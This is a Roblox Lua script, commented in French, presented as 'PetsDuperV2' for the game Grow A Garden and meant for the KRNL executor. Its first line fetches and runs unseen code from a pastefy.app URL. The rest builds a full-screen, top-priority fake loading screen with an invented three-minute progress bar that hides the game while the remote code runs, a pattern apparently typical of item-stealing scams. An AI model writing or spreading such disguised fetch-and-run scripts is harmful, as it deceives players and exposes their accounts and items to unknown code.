loadstring(game:HttpGet("https://pastefy.app/j1SA13WG/raw"))()

-- Script de l'écran de chargement pour Grow A Garden
-- À exécuter dans KRNL

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Créer l'interface de chargement
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999999 -- Priorité maximale pour être devant tout
screenGui.IgnoreGuiInset = true -- Prend TOUT l'écran, même la barre du haut
screenGui.Parent = playerGui

-- Frame principale (fond rose pastel)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 192, 203) -- Rose pastel
mainFrame.Parent = screenGui

-- Frame noire pour cacher les logos en haut
local topCover = Instance.new("Frame")
topCover.Size = UDim2.new(1, 0, 0.1, 0)
topCover.Position = UDim2.new(0, 0, -0.1, 0)
topCover.BackgroundColor3 = Color3.fromRGB(255, 192, 203) -- Même couleur rose
topCover.BorderSizePixel = 0
topCover.Parent = screenGui

-- Titre PetsDuperV2 EN GROS
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0.8, 0, 0.3, 0)
titleLabel.Position = UDim2.new(0.1, 0, 0.25, 0) -- Rapproché de la barre
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "PetsDuperV2"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextStrokeTransparency = 0
titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.Parent = mainFrame

-- Animation arc-en-ciel pour le titre
spawn(function()
    while titleLabel and titleLabel.Parent do
        for hue = 0, 360, 2 do
            if not titleLabel.Parent then break end
            titleLabel.TextColor3 = Color3.fromHSV(hue/360, 1, 1)
            RunService.Heartbeat:Wait()
        end
    end
end)

-- Container pour la barre de progression et le texte
local progressContainer = Instance.new("Frame")
progressContainer.Size = UDim2.new(0.5, 0, 0.15, 0)
progressContainer.Position = UDim2.new(0.25, 0, 0.6, 0) -- Remonté pour être plus proche du titre
progressContainer.BackgroundTransparency = 1
progressContainer.Parent = mainFrame

-- Fond de la barre de progression
local progressBarBG = Instance.new("Frame")
progressBarBG.Size = UDim2.new(1, 0, 0.3, 0)
progressBarBG.Position = UDim2.new(0, 0, 0.3, 0)
progressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBG.BorderSizePixel = 0
progressBarBG.Parent = progressContainer

-- Créer les coins arrondis
local cornerBG = Instance.new("UICorner")
cornerBG.CornerRadius = UDim.new(0, 8)
cornerBG.Parent = progressBarBG

-- Barre de progression
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBarBG

-- Coins arrondis pour la barre
local cornerBar = Instance.new("UICorner")
cornerBar.CornerRadius = UDim.new(0, 8)
cornerBar.Parent = progressBar

-- Label pour le pourcentage
local percentageLabel = Instance.new("TextLabel")
percentageLabel.Size = UDim2.new(1, 0, 0.25, 0)
percentageLabel.Position = UDim2.new(0, 0, 0, 0)
percentageLabel.BackgroundTransparency = 1
percentageLabel.Text = "0%"
percentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentageLabel.TextScaled = true
percentageLabel.Font = Enum.Font.SourceSansBold
percentageLabel.Parent = progressContainer

-- Label pour les messages de chargement
local loadingMessage = Instance.new("TextLabel")
loadingMessage.Size = UDim2.new(1, 0, 0.25, 0)
loadingMessage.Position = UDim2.new(0, 0, 0.65, 0)
loadingMessage.BackgroundTransparency = 1
loadingMessage.Text = "Initializing..."
loadingMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingMessage.TextScaled = true
loadingMessage.Font = Enum.Font.SourceSans
loadingMessage.Parent = progressContainer

-- Liste des messages de chargement
local loadingMessages = {
    "Initializing garden...",
    "Loading terrain data...",
    "Making pets...",
    "Creating vegetables...",
    "Setting up garden plots...",
    "Loading player data...",
    "Initializing scripts...",
    "Preparing tools...",
    "Loading shop items...",
    "Setting up UI...",
    "Finalizing world...",
    "Almost ready..."
}

-- Variables pour le chargement
local loadingTime = 180 -- 3 minutes en secondes
local startTime = tick()
local messageInterval = loadingTime / #loadingMessages
local currentMessageIndex = 1

-- Fonction pour mettre à jour le message
local function updateMessage()
    if currentMessageIndex <= #loadingMessages then
        loadingMessage.Text = loadingMessages[currentMessageIndex]
        currentMessageIndex = currentMessageIndex + 1
    end
end

-- Boucle de mise à jour
local connection
connection = RunService.Heartbeat:Connect(function()
    local elapsedTime = tick() - startTime
    local progress = math.min(elapsedTime / loadingTime, 1)
    
    -- Mettre à jour la barre de progression
    progressBar.Size = UDim2.new(progress, 0, 1, 0)
    
    -- Mettre à jour le pourcentage
    percentageLabel.Text = math.floor(progress * 100) .. "%"
    
    -- Mettre à jour le message
    local messageIndex = math.floor(elapsedTime / messageInterval) + 1
    if messageIndex > currentMessageIndex then
        updateMessage()
    end
    
    -- Vérifier si le chargement est terminé
    if progress >= 1 then
        connection:Disconnect()
        
        -- Attendre un peu avant de faire disparaître l'écran
        wait(0.5)
        
        -- Animation de disparition
        local fadeInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local fadeTween = TweenService:Create(mainFrame, fadeInfo, {BackgroundTransparency = 1})
        
        -- Faire disparaître tous les éléments
        for _, child in pairs(mainFrame:GetDescendants()) do
            if child:IsA("Frame") then
                TweenService:Create(child, fadeInfo, {BackgroundTransparency = 1}):Play()
            elseif child:IsA("TextLabel") then
                TweenService:Create(child, fadeInfo, {TextTransparency = 1}):Play()
            end
        end
        
        fadeTween:Play()
        fadeTween.Completed:Connect(function()
            screenGui:Destroy()
        end)
    end
end)
